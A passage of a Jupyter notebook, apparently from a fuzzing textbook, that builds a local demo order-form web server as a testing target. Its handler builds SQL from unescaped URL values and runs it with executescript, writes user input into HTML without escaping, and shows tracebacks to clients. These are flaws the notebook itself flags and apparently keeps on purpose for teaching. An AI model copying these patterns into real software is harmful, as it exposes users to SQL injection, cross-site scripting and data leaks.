     "shell.execute_reply": "2021-11-01T22:33:59.355384Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import urllib.parse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.360314Z",
     "iopub.status.busy": "2021-11-01T22:33:59.359753Z",
     "iopub.status.idle": "2021-11-01T22:33:59.361527Z",
     "shell.execute_reply": "2021-11-01T22:33:59.362231Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def get_field_values(self):\n",
    "        # Note: this fails to decode non-ASCII characters properly\n",
    "        query_string = urllib.parse.urlparse(self.path).query\n",
    "\n",
    "        # fields is { 'item': ['tshirt'], 'name': ['Jane Doe'], ...}\n",
    "        fields = urllib.parse.parse_qs(query_string, keep_blank_values=True)\n",
    "\n",
    "        values = {}\n",
    "        for key in fields:\n",
    "            values[key] = fields[key][0]\n",
    "\n",
    "        return values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The method `handle_order()` takes these values from the URL, stores the order, and returns a page confirming the order.  If anything goes wrong, it sends an internal server error."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.366302Z",
     "iopub.status.busy": "2021-11-01T22:33:59.365746Z",
     "iopub.status.idle": "2021-11-01T22:33:59.367962Z",
     "shell.execute_reply": "2021-11-01T22:33:59.368491Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def handle_order(self):\n",
    "        values = self.get_field_values()\n",
    "        self.store_order(values)\n",
    "        self.send_order_received(values)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Storing the order makes use of the database connection defined above; we create an SQL command instantiated with the values as extracted from the URL."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.373105Z",
     "iopub.status.busy": "2021-11-01T22:33:59.372460Z",
     "iopub.status.idle": "2021-11-01T22:33:59.374900Z",
     "shell.execute_reply": "2021-11-01T22:33:59.375311Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def store_order(self, values):\n",
    "        db = sqlite3.connect(ORDERS_DB)\n",
    "        # The following should be one line\n",
    "        sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
    "        self.log_message(\"%s\", sql_command)\n",
    "        db.executescript(sql_command)\n",
    "        db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "After storing the order, we send the confirmation HTML page, which again is instantiated with the values from the URL."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.380448Z",
     "iopub.status.busy": "2021-11-01T22:33:59.379605Z",
     "iopub.status.idle": "2021-11-01T22:33:59.381566Z",
     "shell.execute_reply": "2021-11-01T22:33:59.381992Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def send_order_received(self, values):\n",
    "        # Should use html.escape()\n",
    "        values[\"item_name\"] = FUZZINGBOOK_SWAG[values[\"item\"]]\n",
    "        confirmation = HTML_ORDER_RECEIVED.format(**values).encode(\"utf8\")\n",
    "\n",
    "        self.send_response(HTTPStatus.OK, \"Order received\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(confirmation)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Other HTTP commands\n",
    "\n",
    "Besides the `GET` command (which does all the heavy lifting), HTTP servers can also support other HTTP commands; we support the `HEAD` command, which returns the head information of a Web page.  In our case, this is always empty."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.386411Z",
     "iopub.status.busy": "2021-11-01T22:33:59.385805Z",
     "iopub.status.idle": "2021-11-01T22:33:59.387962Z",
     "shell.execute_reply": "2021-11-01T22:33:59.388458Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def do_HEAD(self):\n",
    "        # print(\"HEAD \" + self.path)\n",
    "        self.send_response(HTTPStatus.OK)\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Error Handling\n",
    "\n",
    "We have defined pages for submitting and processing orders; now we also need a few pages for errors that might occur."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Page Not Found\n",
    "\n",
    "This page is displayed if a non-existing page (i.e. anything except `/` or `/order`) is requested."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.392281Z",
     "iopub.status.busy": "2021-11-01T22:33:59.391580Z",
     "iopub.status.idle": "2021-11-01T22:33:59.393442Z",
     "shell.execute_reply": "2021-11-01T22:33:59.393820Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "HTML_NOT_FOUND = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Sorry.</strong>\n",
    "  <p>\n",
    "  This page does not exist.  Try our <a href=\"/\">order form</a> instead.\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "  \"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.397706Z",
     "iopub.status.busy": "2021-11-01T22:33:59.396963Z",
     "iopub.status.idle": "2021-11-01T22:33:59.400393Z",
     "shell.execute_reply": "2021-11-01T22:33:59.400796Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Sorry.</strong>\n",
       "  <p>\n",
       "  This page does not exist.  Try our <a href=\"/\">order form</a> instead.\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_NOT_FOUND)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The method `not_found()` takes care of sending this out with the appropriate HTTP status code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.405565Z",
     "iopub.status.busy": "2021-11-01T22:33:59.404932Z",
     "iopub.status.idle": "2021-11-01T22:33:59.406764Z",
     "shell.execute_reply": "2021-11-01T22:33:59.407258Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def not_found(self):\n",
    "        self.send_response(HTTPStatus.NOT_FOUND, \"Not found\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        message = HTML_NOT_FOUND\n",
    "        self.wfile.write(message.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Internal Errors\n",
    "\n",
    "This page is shown for any internal errors that might occur.  For diagnostic purposes, we have it include the traceback of the failing function."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.411486Z",
     "iopub.status.busy": "2021-11-01T22:33:59.410674Z",
     "iopub.status.idle": "2021-11-01T22:33:59.413285Z",
     "shell.execute_reply": "2021-11-01T22:33:59.413784Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_INTERNAL_SERVER_ERROR = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
    "  <p>\n",
    "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
    "  <pre>{error_message}</pre>\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "  \"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.417747Z",
     "iopub.status.busy": "2021-11-01T22:33:59.417047Z",
     "iopub.status.idle": "2021-11-01T22:33:59.420186Z",
     "shell.execute_reply": "2021-11-01T22:33:59.420572Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>{error_message}</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_INTERNAL_SERVER_ERROR)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.424813Z",
     "iopub.status.busy": "2021-11-01T22:33:59.423975Z",
     "iopub.status.idle": "2021-11-01T22:33:59.425980Z",
     "shell.execute_reply": "2021-11-01T22:33:59.426443Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import sys\n",
    "import traceback"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.431552Z",
     "iopub.status.busy": "2021-11-01T22:33:59.430731Z",
     "iopub.status.idle": "2021-11-01T22:33:59.432565Z",
     "shell.execute_reply": "2021-11-01T22:33:59.433093Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def internal_server_error(self):\n",
    "        self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR, \"Internal Error\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        exc = traceback.format_exc()\n",
    "        self.log_message(\"%s\", exc.strip())\n",
    "\n",
    "        message = HTML_INTERNAL_SERVER_ERROR.format(error_message=exc)\n",
    "        self.wfile.write(message.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Logging\n",
    "\n",
    "Our server runs as a separate process in the background, waiting to receive commands at all time.  To see what it is doing, we implement a special logging mechanism.  The `httpd_message_queue` establishes a queue into which one process (the server) can store Python objects, and in which another process (the notebook) can retrieve them.  We use this to pass log messages from the server, which we can then display in the notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "For multiprocessing, we use the `multiprocess` module - a variant of the standard Python `multiprocessing` module that also works in notebooks. If you are running this code outside of a notebook, you can also use `multiprocessing` instead."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.436669Z",
     "iopub.status.busy": "2021-11-01T22:33:59.435955Z",
     "iopub.status.idle": "2021-11-01T22:33:59.454599Z",
     "shell.execute_reply": "2021-11-01T22:33:59.455255Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from multiprocess import Queue"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.460087Z",
     "iopub.status.busy": "2021-11-01T22:33:59.459181Z",
     "iopub.status.idle": "2021-11-01T22:33:59.466938Z",
     "shell.execute_reply": "2021-11-01T22:33:59.467396Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "HTTPD_MESSAGE_QUEUE = Queue()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us place two messages in the queue:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.470856Z",
     "iopub.status.busy": "2021-11-01T22:33:59.470313Z",
     "iopub.status.idle": "2021-11-01T22:33:59.472570Z",
     "shell.execute_reply": "2021-11-01T22:33:59.472955Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTTPD_MESSAGE_QUEUE.put(\"I am another message\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.476746Z",
     "iopub.status.busy": "2021-11-01T22:33:59.476215Z",
     "iopub.status.idle": "2021-11-01T22:33:59.477594Z",
     "shell.execute_reply": "2021-11-01T22:33:59.478122Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "HTTPD_MESSAGE_QUEUE.put(\"I am one more message\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To distinguish server messages from other parts of the notebook, we format them specially:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.481708Z",
     "iopub.status.busy": "2021-11-01T22:33:59.481100Z",
     "iopub.status.idle": "2021-11-01T22:33:59.482854Z",
     "shell.execute_reply": "2021-11-01T22:33:59.483232Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from bookutils import rich_output, terminal_escape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.486775Z",
     "iopub.status.busy": "2021-11-01T22:33:59.486260Z",
     "iopub.status.idle": "2021-11-01T22:33:59.487905Z",
     "shell.execute_reply": "2021-11-01T22:33:59.488268Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def display_httpd_message(message):\n",
    "    if rich_output():\n",
    "        display(\n",
    "            HTML(\n",
    "                '<pre style=\"background: NavajoWhite;\">' +\n",
    "                message +\n",
    "                \"</pre>\"))\n",
    "    else:\n",
    "        print(terminal_escape(message))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.492060Z",
     "iopub.status.busy": "2021-11-01T22:33:59.491454Z",
     "iopub.status.idle": "2021-11-01T22:33:59.494229Z",
     "shell.execute_reply": "2021-11-01T22:33:59.494607Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">I am a httpd server message</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display_httpd_message(\"I am a httpd server message\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The method `print_httpd_messages()` prints all messages accumulated in the queue so far:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.498497Z",
     "iopub.status.busy": "2021-11-01T22:33:59.497842Z",
     "iopub.status.idle": "2021-11-01T22:33:59.499626Z",
     "shell.execute_reply": "2021-11-01T22:33:59.500049Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def print_httpd_messages():\n",
    "    while not HTTPD_MESSAGE_QUEUE.empty():\n",
    "        message = HTTPD_MESSAGE_QUEUE.get()\n",
    "        display_httpd_message(message)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.503153Z",
     "iopub.status.busy": "2021-11-01T22:33:59.502631Z",
     "iopub.status.idle": "2021-11-01T22:33:59.504229Z",
     "shell.execute_reply": "2021-11-01T22:33:59.504607Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:33:59.507469Z",
     "iopub.status.busy": "2021-11-01T22:33:59.506902Z",
     "iopub.status.idle": "2021-11-01T22:34:00.517895Z",
     "shell.execute_reply": "2021-11-01T22:34:00.518410Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">I am another message</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">I am one more message</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "time.sleep(1)\n",
    "print_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "With `clear_httpd_messages()`, we can silently discard all pending messages:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.522837Z",
     "iopub.status.busy": "2021-11-01T22:34:00.522214Z",
     "iopub.status.idle": "2021-11-01T22:34:00.524041Z",
     "shell.execute_reply": "2021-11-01T22:34:00.524505Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def clear_httpd_messages():\n",
    "    while not HTTPD_MESSAGE_QUEUE.empty():\n",
    "        HTTPD_MESSAGE_QUEUE.get()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The method `log_message()` in the request handler makes use of the queue to store its messages:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.528960Z",
     "iopub.status.busy": "2021-11-01T22:34:00.528399Z",
     "iopub.status.idle": "2021-11-01T22:34:00.530046Z",
     "shell.execute_reply": "2021-11-01T22:34:00.530471Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def log_message(self, format, *args):\n",
    "        message = (\"%s - - [%s] %s\\n\" %\n",
    "                   (self.address_string(),\n",
    "                    self.log_date_time_string(),\n",
    "                    format % args))\n",
    "        HTTPD_MESSAGE_QUEUE.put(message)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "In [the chapter on carving](Carver.ipynb), we had introduced a `webbrowser()` method which retrieves the contents of the given URL.  We now extend it such that it also prints out any log messages produced by the server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.534486Z",
     "iopub.status.busy": "2021-11-01T22:34:00.533827Z",
     "iopub.status.idle": "2021-11-01T22:34:00.583757Z",
     "shell.execute_reply": "2021-11-01T22:34:00.584207Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.588397Z",
     "iopub.status.busy": "2021-11-01T22:34:00.587876Z",
     "iopub.status.idle": "2021-11-01T22:34:00.589600Z",
     "shell.execute_reply": "2021-11-01T22:34:00.589981Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def webbrowser(url, mute=False):\n",
    "    \"\"\"Download the http/https resource given by the URL\"\"\"\n",
    "    import requests  # for imports\n",
    "\n",
    "    try:\n",
    "        r = requests.get(url)\n",
    "        contents = r.text\n",
    "    finally:\n",
    "        if not mute:\n",
    "            print_httpd_messages()\n",
    "        else:\n",
    "            clear_httpd_messages()\n",
    "\n",
    "    return contents"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Running the Server\n",
    "\n",
    "After all these definitions, we are now ready to get the Web server up and running.  We run the server on the *local host* – that is, the same machine which also runs this notebook.  We check for an accessible port and put the resulting URL in the queue created earlier."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.594386Z",
     "iopub.status.busy": "2021-11-01T22:34:00.593809Z",
     "iopub.status.idle": "2021-11-01T22:34:00.595492Z",
     "shell.execute_reply": "2021-11-01T22:34:00.595864Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "def run_httpd_forever(handler_class):\n",
    "    host = \"127.0.0.1\"  # localhost IP\n",
    "    for port in range(8800, 9000):\n",
    "        httpd_address = (host, port)\n",
    "\n",
    "        try:\n",
    "            httpd = HTTPServer(httpd_address, handler_class)\n",
    "            break\n",
    "        except OSError:\n",
    "            continue\n",
    "\n",
    "    httpd_url = \"http://\" + host + \":\" + repr(port)\n",
    "    HTTPD_MESSAGE_QUEUE.put(httpd_url)\n",
    "    httpd.serve_forever()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The function `start_httpd()` starts the server in a separate process, which we start using the `multiprocess` module.  It retrieves its URL from the message queue and returns it, such that we can start talking to the server."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.599094Z",
     "iopub.status.busy": "2021-11-01T22:34:00.598523Z",
     "iopub.status.idle": "2021-11-01T22:34:00.600077Z",
     "shell.execute_reply": "2021-11-01T22:34:00.600446Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from multiprocess import Process"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.604113Z",
     "iopub.status.busy": "2021-11-01T22:34:00.603597Z",
     "iopub.status.idle": "2021-11-01T22:34:00.605159Z",
     "shell.execute_reply": "2021-11-01T22:34:00.605589Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def start_httpd(handler_class=SimpleHTTPRequestHandler):\n",
    "    clear_httpd_messages()\n",
    "\n",
    "    httpd_process = Process(target=run_httpd_forever, args=(handler_class,))\n",
    "    httpd_process.start()\n",
    "\n",
    "    httpd_url = HTTPD_MESSAGE_QUEUE.get()\n",
    "    return httpd_process, httpd_url"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us now start the server and save its URL:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.609348Z",
     "iopub.status.busy": "2021-11-01T22:34:00.608523Z",
     "iopub.status.idle": "2021-11-01T22:34:00.624303Z",
     "shell.execute_reply": "2021-11-01T22:34:00.624925Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800'"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "httpd_process, httpd_url = start_httpd()\n",
    "httpd_url"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Interacting with the Server\n",
    "\n",
    "Let us now access the server just created."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Direct Browser Access\n",
    "\n",
    "If you are running the Jupyter notebook server on the local host as well, you can now access the server directly at the given URL.  Simply open the address in `httpd_url` by clicking on the link below.\n",
    "\n",
    "**Note**: This only works if you are running the Jupyter notebook server on the local host."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.630220Z",
     "iopub.status.busy": "2021-11-01T22:34:00.629697Z",
     "iopub.status.idle": "2021-11-01T22:34:00.631341Z",
     "shell.execute_reply": "2021-11-01T22:34:00.631864Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def print_url(url):\n",
    "    if rich_output():\n",
    "        display(HTML('<pre><a href=\"%s\">%s</a></pre>' % (url, url)))\n",
    "    else:\n",
    "        print(terminal_escape(url))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.635716Z",
     "iopub.status.busy": "2021-11-01T22:34:00.635079Z",
     "iopub.status.idle": "2021-11-01T22:34:00.637501Z",
     "shell.execute_reply": "2021-11-01T22:34:00.637936Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800\">http://127.0.0.1:8800</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "print_url(httpd_url)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Even more convenient, you may be able to interact directly with the server using the window below. \n",
    "\n",
    "**Note**: This only works if you are running the Jupyter notebook server on the local host."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.641038Z",
     "iopub.status.busy": "2021-11-01T22:34:00.640472Z",
     "iopub.status.idle": "2021-11-01T22:34:00.642150Z",
     "shell.execute_reply": "2021-11-01T22:34:00.642515Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from IPython.display import IFrame"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.646110Z",
     "iopub.status.busy": "2021-11-01T22:34:00.645593Z",
     "iopub.status.idle": "2021-11-01T22:34:00.647864Z",
     "shell.execute_reply": "2021-11-01T22:34:00.648305Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"100%\"\n",
       "            height=\"230\"\n",
       "            src=\"http://127.0.0.1:8800\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "            \n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x1125825b0>"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "IFrame(httpd_url, '100%', 230)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "After interaction, you can retrieve the messages produced by the server:"
   ]
